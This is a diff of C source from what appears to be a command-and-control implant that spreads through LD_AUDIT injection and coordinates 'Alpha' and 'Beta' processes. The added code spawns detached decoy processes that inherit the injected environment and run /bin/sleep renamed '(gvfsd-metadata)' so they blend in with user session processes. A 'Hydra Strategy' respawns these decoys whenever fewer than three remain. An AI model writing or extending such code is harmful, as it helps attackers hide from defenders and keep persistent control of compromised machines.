@@ -20,7 +20,6 @@
  * ============================================================================
  */
 
-#define _GNU_SOURCE
 #include "../c2_comms/crypto.h"
 #include "../common/config.h"
 #include "../common/logging.h"
@@ -37,9 +36,11 @@
 #include <stdlib.h>
 #include <string.h>
 #include <sys/mman.h>
+#include <sys/stat.h>
 #include <sys/socket.h>
 #include <sys/un.h>
 #include <unistd.h>
+#include <fcntl.h>
 
 
 /* ── Global State ────────────────────────────────────────────────────────── */
@@ -82,7 +83,7 @@ static aegis_result_t create_ipc_socket(void) {
   struct sockaddr_un addr;
   memset(&addr, 0, sizeof(addr));
   addr.sun_family = AF_UNIX;
-  strncpy(addr.sun_path, g_sock_path, sizeof(addr.sun_path) - 1);
+  snprintf(addr.sun_path, sizeof(addr.sun_path), "%.107s", g_sock_path);
 
   if (bind(g_server_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
     close(g_server_fd);
@@ -386,7 +387,7 @@ static void *watchdog_thread(void *arg) {
       if (entry->d_name[0] < '0' || entry->d_name[0] > '9')
         continue;
 
-      char comm_path[128];
+      char comm_path[300];
       snprintf(comm_path, sizeof(comm_path), "/proc/%s/comm", entry->d_name);
 
       char comm[256] = {0};
@@ -449,6 +450,48 @@ static void *watchdog_thread(void *arg) {
   return NULL;
 }
 
+/* ── Internal: Decoy Beta Spawning ───────────────────────────────────────── */
+
+extern char **environ;
+
+static void spawn_decoy_beta(void) {
+  /*
+   * Spawn a benign process that inherits our LD_AUDIT environment.
+   * This new process will load the auditor, fail the Alpha election
+   * (since we hold the lock), and become a Beta node.
+   */
+  pid_t pid = fork();
+  if (pid < 0)
+    return;
+  if (pid > 0)
+    return; /* Parent returns */
+
+  /* Child: detach and exec benign payload */
+  setsid();
+
+  /* Close standard FDs to avoid noise */
+  int devnull = open("/dev/null", O_RDWR);
+  if (devnull >= 0) {
+    dup2(devnull, 0);
+    dup2(devnull, 1);
+    dup2(devnull, 2);
+    if (devnull > 2)
+      close(devnull);
+  }
+
+  /* Ensure we are not the Anchor (so it behaves as a normal beta) */
+  unsetenv("AEGIS_ANCHOR");
+
+  /*
+   * Execute a long-running benign process.
+   * We mask it as (gvfsd-metadata) to blend in with user session processes.
+   */
+  char *argv[] = {"(gvfsd-metadata)", "infinity", NULL};
+  execve("/bin/sleep", argv, environ);
+
+  exit(0);
+}
+
 /* ── Thread: Heartbeat Monitor ───────────────────────────────────────────── */
 
 static void *heartbeat_monitor_thread(void *arg) {
@@ -469,22 +512,34 @@ static void *heartbeat_monitor_thread(void *arg) {
 
     pthread_mutex_lock(&g_beta_mutex);
 
+    int active_betas = 0;
     for (int i = 0; i < g_beta_count; i++) {
-      if (g_betas[i].alive &&
-          (now - g_betas[i].last_heartbeat_ns) > timeout_ns) {
+      if (g_betas[i].alive) {
+        if ((now - g_betas[i].last_heartbeat_ns) > timeout_ns) {
 
-        aegis_log_event(g_alpha_log, LOG_CAT_ALPHA, LOG_SEV_WARN,
-                        "Beta node DEAD: pid=%d (no heartbeat "
-                        "for %ds)",
-                        g_betas[i].id.pid, AEGIS_IPC_DEAD_TIMEOUT_SEC);
+          aegis_log_event(g_alpha_log, LOG_CAT_ALPHA, LOG_SEV_WARN,
+                          "Beta node DEAD: pid=%d (no heartbeat "
+                          "for %ds)",
+                          g_betas[i].id.pid, AEGIS_IPC_DEAD_TIMEOUT_SEC);
 
-        g_betas[i].alive = false;
+          g_betas[i].alive = false;
 
-        if (g_betas[i].sock_fd >= 0) {
-          close(g_betas[i].sock_fd);
-          g_betas[i].sock_fd = -1;
+          if (g_betas[i].sock_fd >= 0) {
+            close(g_betas[i].sock_fd);
+            g_betas[i].sock_fd = -1;
+          }
+        } else {
+          active_betas++;
         }
       }
+    }
+
+    /* Hydra Strategy: Maintain minimum mesh size */
+    if (active_betas < 3) {
+      aegis_log_event(g_alpha_log, LOG_CAT_ALPHA, LOG_SEV_INFO,
+                      "Mesh size low (%d/3) — spawning Decoy Beta",
+                      active_betas);
+      spawn_decoy_beta();
     }
 
     pthread_mutex_unlock(&g_beta_mutex);
